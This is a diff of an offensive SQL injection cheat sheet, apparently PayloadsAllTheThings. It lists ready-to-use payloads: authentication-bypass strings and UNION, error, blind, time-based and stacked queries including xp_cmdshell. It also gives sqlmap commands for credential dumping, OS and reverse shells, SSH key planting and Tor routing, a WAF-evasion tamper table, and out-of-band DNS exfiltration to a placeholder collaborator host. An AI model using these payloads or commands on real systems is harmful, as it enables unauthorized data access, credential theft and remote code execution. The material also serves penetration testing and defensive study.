@@ -1,658 +1,499 @@
 # SQL Injection
 
-> A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.
+> SQL Injection (SQLi)  is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. SQL Injection is one of the most common and severe types of web application vulnerabilities, enabling attackers to execute arbitrary SQL code on the database. This can lead to unauthorized data access, data manipulation, and, in some cases, full compromise of the database server.
 
-Attempting to manipulate SQL queries may have goals including:
-- Information Leakage
-- Disclosure of stored data
-- Manipulation of stored data
-- Bypassing authorization controls
 
 ## Summary
 
-* [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
-* [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
-* [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
-* [CheatSheet PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
-* [CheatSheet SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
-* [CheatSheet Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
-* [Entry point detection](#entry-point-detection)
+* [CheatSheets](#cheatsheets)
+    * [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
+    * [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
+    * [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
+    * [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
+    * [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
+    * [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
+    * [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
+    * [SQLmap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap%20Cheatsheet.md)
+* [Tools](#tools)
+* [Entry Point Detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
-* [SQL injection using SQLmap](#sql-injection-using-sqlmap)
-  * [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
-  * [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
-  * [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
-  * [Second order injection](#second-order-injection)
-  * [Shell](#shell)
-  * [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
-  * [Using TOR with SQLmap](#using-tor-with-sqlmap)
-  * [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
-  * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
-  * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
-  * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
-  * [SQLmap without SQL injection](#sqlmap-without-sql-injection)
-* [Authentication bypass](#authentication-bypass)
-  * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
-* [Polyglot injection](#polyglot-injection-multicontext)
-* [Routed injection](#routed-injection)
-* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
-* [WAF Bypass](#waf-bypass)
+* [Authentication Bypass](#authentication-bypass)
+    * [Raw MD5 and SHA1](#raw-md5-and-sha1)
+* [UNION Based Injection](#union-based-injection)
+* [Error Based Injection](#error-based-injection)
+* [Blind Injection](#blind-injection)
+    * [Boolean Based Injection](#boolean-based-injection)
+    * [Blind Error Based Injection](#blind-error-based-injection)
+    * [Time Based Injection](#time-based-injection)
+    * [Out of Band (OAST)](#out-of-band-oast)
+* [Stack Based Injection](#stack-based-injection)
+* [Polyglot Injection](#polyglot-injection)
+* [Routed Injection](#routed-injection)
+* [Second Order SQL Injection](#second-order-sql-injection)
+* [Generic WAF Bypass](#generic-waf-bypass)
+    * [White Spaces](#white-spaces)
+    * [No Comma Allowed](#no-comma-allowed)
+    * [No Equal Allowed](#no-equal-allowed)
+    * [Case Modification](#case-modification)
+* [Labs](#labs)
+* [References](#references)
 
-## Entry point detection
 
-Detection of an SQL injection entry point
-Simple characters
+## Tools
 
-```sql
-'
-%27
-"
-%22
-#
-%23
-;
-%3B
-)
-Wildcard (*)
-&apos;  # required for XML content
-```
+* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool
+* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws
 
-Multiple encoding
 
-```sql
-%%2727
-%25%27
-```
+## Entry Point Detection
 
-Merging characters
+Detecting the entry point in SQL injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries.
 
-```sql
-`+HERP
-'||'DERP
-'+'herp
-' 'DERP
-'%20'HERP
-'%2B'HERP
-```
+* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
+    * Simple characters: `'`, `"`, `;`, `)` and `*`
+    * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
+    * Multiple encoding: `%%2727`, `%25%27`
+    * Unicode characters: `U+02BA`, `U+02B9`
+        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
+        * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')
 
-Logic Testing
+* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
+    * Merging characters
+      ```sql
+      `+HERP
+      '||'DERP
+      '+'herp
+      ' 'DERP
+      '%20'HERP
+      '%2B'HERP
+      ```
+    * Logic Testing
+      ```sql
+      page.asp?id=1 or 1=1 -- true
+      page.asp?id=1' or 1=1 -- true
+      page.asp?id=1" or 1=1 -- true
+      page.asp?id=1 and 1=2 -- false
+      ```
 
-```sql
-page.asp?id=1 or 1=1 -- true
-page.asp?id=1' or 1=1 -- true
-page.asp?id=1" or 1=1 -- true
-page.asp?id=1 and 1=2 -- false
-```
+* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
 
-Weird characters
-
-```sql
-Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
-transformed into U+0022 QUOTATION MARK (")
-Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
-transformed into U+0027 APOSTROPHE (')
-```
 
 ## DBMS Identification
 
-```c
-["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
-["connection_id()=connection_id()"                 ,"MYSQL"],
-["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
-["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
-["@@CONNECTIONS>0"                                 ,"MSSQL"],
-["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
-["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
-["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
-["ROWNUM=ROWNUM"                                   ,"ORACLE"],
-["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
-["LNNVL(0=123)"                                    ,"ORACLE"],
-["5::int=5"                                        ,"POSTGRESQL"],
-["5::integer=5"                                    ,"POSTGRESQL"],
-["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
-["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
-["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
-["current_database()=current_database()"           ,"POSTGRESQL"],
-["sqlite_version()=sqlite_version()"               ,"SQLITE"],
-["last_insert_rowid()>1"                           ,"SQLITE"],
-["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
-["val(cvar(1))=1"                                  ,"MSACCESS"],
-["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
-["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
-["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
-["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
+### DBMS Identification Keyword Based
+
+Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.
+
+| DBMS                | SQL Payload                     |
+| ------------------- | ------------------------------- |
+| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
+| MySQL               | `connection_id()=connection_id()` |
+| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
+| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
+| MSSQL               | `@@CONNECTIONS>0` |
+| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |
+| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |
+| MSSQL               | `USER_ID(1)=USER_ID(1)` |
+| ORACLE              | `ROWNUM=ROWNUM` |
+| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
+| ORACLE              | `LNNVL(0=123)` |
+| POSTGRESQL          | `5::int=5` |
+| POSTGRESQL          | `5::integer=5` |
+| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |
+| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |
+| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |
+| POSTGRESQL          | `current_database()=current_database()` |
+| SQLITE              | `sqlite_version()=sqlite_version()` |
+| SQLITE              | `last_insert_rowid()>1` |
+| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |
+| MSACCESS            | `val(cvar(1))=1` |
+| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |
+
+
+### DBMS Identification Error Based
+
+Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.
+
+| DBMS                | Example Error Message                                                                    | Example Payload |
+| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
+| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
+| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
+| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
+| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
+| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
+| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
+| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
+| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
+| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |
+
+
+
+## Authentication Bypass
+
+In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this: 
+
+```SQL
+SELECT * FROM users WHERE username = 'user' AND password = 'pass';
 ```
 
-## SQL injection using SQLmap
-
-### Basic arguments for SQLmap
-
-```powershell
-sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
-```
-
-### Load a request file and use mobile user-agent
-
-```powershell
-sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
-```
-
-### Custom injection in UserAgent/Header/Referer/Cookie
-
-```powershell
-python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
-The injection is located at the '*'
-```
-
-### Second order injection
-
-```powershell
-python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
-sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
-```
-
-### Shell
-
-```powershell
-SQL Shell
-python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
-
-Simple Shell
-python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
-
-Dropping a reverse-shell / meterpreter
-python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
-
-SSH Shell by dropping an SSH key
-python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
-```
-
-### Crawl a website with SQLmap and auto-exploit
-
-```powershell
-sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
-
---batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
---crawl = how deep you want to crawl a site
---forms = Parse and test forms
-```
-
-### Using TOR with SQLmap
-
-```powershell
-sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
-```
-
-### Using a proxy with SQLmap
-
-```powershell
-sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
-```
-
-### Using Chrome cookie and a Proxy
-
-```powershell
-sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
-```
-
-### Using suffix to tamper the injection
-
-```powershell
-python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
-```
-
-
-### General tamper option and tamper's list
-
-```powershell
-tamper=name_of_the_tamper
-```
-
-| Tamper | Description |
-| --- | --- |
-|0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
-|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
-|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
-|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
-|base64encode.py | Base64 all characters in a given payload  |
-|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
-|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
-|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
-|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |
-|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
-|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
-|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
-|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
-|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |
-|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
-|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
-|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
-|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
-|escapequotes.py | Slash escape quotes (' and ") |
-|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
-|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
-|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
-|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart| 
-|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
-|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
-|least.py | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
-|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |
-|modsecurityversioned.py | Embraces complete query with versioned comment |
-|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
-|multiplespaces.py | Adds multiple spaces around SQL keywords |
-|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
-|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
-|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
-|percentage.py | Adds a percentage sign ('%') infront of each character  |
-|plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
-|plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
-|randomcase.py | Replaces each keyword character with random case value |
-|randomcomments.py | Add random comments to SQL keywords|
-|securesphere.py | Appends special crafted string |
-|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
-|space2comment.py | Replaces space character (' ') with comments |
-|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
-|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
-|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
-|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
-|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
-|space2plus.py |  Replaces space character (' ') with plus ('+')  |
-|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
-|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
-|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
-|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
-|varnish.py | Append a HTTP header 'X-originating-IP' |
-|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
-|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
-|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
-
-### SQLmap without SQL injection
-
-You can use SQLmap to access a database via its port instead of a URL.
-
-```ps1
-sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
-```
-
-## Authentication bypass
+An attacker can attempt to inject malicious SQL code into the username or password fields. For instance, if the attacker types the following in the username field:
 
 ```sql
-'-'
-' '
-'&'
-'^'
-'*'
-' or 1=1 limit 1 -- -+
-'="or'
-' or ''-'
-' or '' '
-' or ''&'
-' or ''^'
-' or ''*'
-'-||0'
-"-||0"
-"-"
-" "
-"&"
-"^"
-"*"
-'--'
-"--"
-'--' / "--"
-" or ""-"
-" or "" "
-" or ""&"
-" or ""^"
-" or ""*"
-or true--
-" or true--
-' or true--
-") or true--
-') or true--
-' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
-" or "x"="x
-") or ("x")=("x
-")) or (("x"))=(("x
-or 2 like 2
-or 1=1
-or 1=1--
-or 1=1#
-or 1=1/*
-admin' --
-admin' -- -
-admin' #
-admin'/*
-admin' or '2' LIKE '1
-admin' or 2 LIKE 2--
-admin' or 2 LIKE 2#
-admin') or 2 LIKE 2#
-admin') or 2 LIKE 2--
-admin') or ('2' LIKE '2
-admin') or ('2' LIKE '2'#
-admin') or ('2' LIKE '2'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
-admin' or 1=1--
-admin' or 1=1#
-admin' or 1=1/*
-admin') or ('1'='1
-admin') or ('1'='1'--
-admin') or ('1'='1'#
-admin') or ('1'='1'/*
-admin') or '1'='1
-admin') or '1'='1'--
-admin') or '1'='1'#
-admin') or '1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-admin" --
-admin';-- azer 
-admin" #
-admin"/*
-admin" or "1"="1
-admin" or "1"="1"--
-admin" or "1"="1"#
-admin" or "1"="1"/*
-admin"or 1=1 or ""="
-admin" or 1=1
-admin" or 1=1--
-admin" or 1=1#
-admin" or 1=1/*
-admin") or ("1"="1
-admin") or ("1"="1"--
-admin") or ("1"="1"#
-admin") or ("1"="1"/*
-admin") or "1"="1
-admin") or "1"="1"--
-admin") or "1"="1"#
-admin") or "1"="1"/*
-1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+' OR '1'='1
 ```
 
-## Authentication Bypass (Raw MD5 SHA1)
+And leaves the password field empty, the resulting SQL query executed might look like this:
 
-When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
+```SQL
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
+```
+
+Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.
+
+:warning: In this case, the database will return an array of results because it will match every users in the table. This will produce an error in the server side since it was expecting only one result. By adding a `LIMIT` clause, you can restrict the number of rows returned by the query. By submitting the following payload in the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password field while using the correct username to target a specific user. 
+
+```sql
+' or 1=1 limit 1 --
+```
+
+:warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.
+
+* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)
+
+
+### Raw MD5 and SHA1
+
+In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.
 
 ```php
-"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
+sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
 ```
 
-Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`
+An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.
+
+
+| Hash | Input    | Output (Raw)            |  Payload  |
+| ---- | -------- | ----------------------- | --------- |
+| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |
+| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8` | `'or'` |
+| sha1 | 3fDf     | `Q�u'='�@�[�t�- o��_-!` | `'='`     |
+| sha1 | 178374   | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`     |
+| sha1 | 17       | `Ùp2ûjww%6\`            | `\`       |
+
+This behavior can be abused to bypass the authentication by escaping the context.
 
 ```php
-md5("ffifdyop", true) = 'or'6�]��!r,��b
-sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
+sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
+sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
 ```
 
-Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
 
-## Polyglot injection (multicontext)
+## UNION Based Injection
+
+In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.
+
+Let's assume a vulnerable web application retrieves product details based on a product ID from a database: 
+
+```sql
+SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
+```
+
+An attacker could modify the `input_id` to include the data from another table like `users`.
+
+```SQL
+1' UNION SELECT username, password FROM users --
+```
+
+After submitting our payload, the query become the following SQL:
+
+```SQL
+SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
+```
+
+:warning: The 2 SELECT clauses must have the same number of columns.
+
+
+## Error Based Injection
+
+Error-Based SQL Injection is a technique that relies on the error messages returned from the database to gather information about the database structure. By manipulating the input parameters of an SQL query, an attacker can make the database generate error messages. These errors can reveal critical details about the database, such as table names, column names, and data types, which can be used to craft further attacks.
+
+For example, on a PostgreSQL, injecting this payload in a SQL query would result in an error since the LIMIT clause is expecting a numeric value.
+
+```sql
+LIMIT CAST((SELECT version()) as numeric) 
+```
+
+The error will leak the output of the `version()`.
+
+```ps1
+ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
+```
+
+
+## Blind Injection
+
+Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response. 
+
+
+### Boolean Based Injection
+
+Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.
+
+Size of the page, HTTP response code, or missing parts of the page are strong indicators to detect whether the Boolean-based Blind SQL injection was successful.
+
+Here is a naive example to recover the content of the `@@hostname` variable.
+
+**Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection vulnerability. For example: 
+
+```ps1
+http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
+http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
+```
+ 
+**Extract Hostname Length**: Guess the length of the hostname by incrementing until the response indicates a match. For example: 
+
+```ps1
+http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
+http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
+http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
+```
+
+**Extract Hostname Characters** : Extract each character of the hostname using substring and ASCII comparison: 
+
+```ps1
+http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
+http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
+```
+ 
+Then repeat the method to discover every characters of the `@@hostname`. Obviously this example is not the fastest way to obtain them. Here are a few pointers to speed it up:
+
+- Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient. 
+
+
+### Blind Error Based Injection
+
+Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.
+
+
+**Example**: Using `json()` function in SQLite to trigger an error as an oracle to know when the injection is true or false.
+
+```sql
+' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
+' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
+```
+
+
+### Time Based Injection
+
+Time-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain queries return true or false. It is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed SQL commands. The attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.
+
+* Default `SLEEP` function for the database
+
+```sql
+' AND SLEEP(5)/*
+' AND '1'='1' AND SLEEP(5)
+' ; WAITFOR DELAY '00:00:05' --
+```
+
+* Heavy queries that take a lot of time to complete, usually crypto functions.
+
+```sql
+BENCHMARK(2000000,MD5(NOW()))
+```
+
+Let's see a basic example to recover the version of the database using a time based sql injection.
+
+```sql
+http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
+```
+
+If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.
+
+
+### Out of Band (OAST)
+
+Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable. 
+
+Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration: 
+
+* MySQL
+
+  ```sql
+  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+  ```
+
+* MSSQL
+
+  ```sql
+  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+  ```
+
+
+## Stacked Based Injection
+
+Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.
+
+```sql
+1; EXEC xp_cmdshell('whoami') --
+```
+
+
+## Polyglot Injection
+
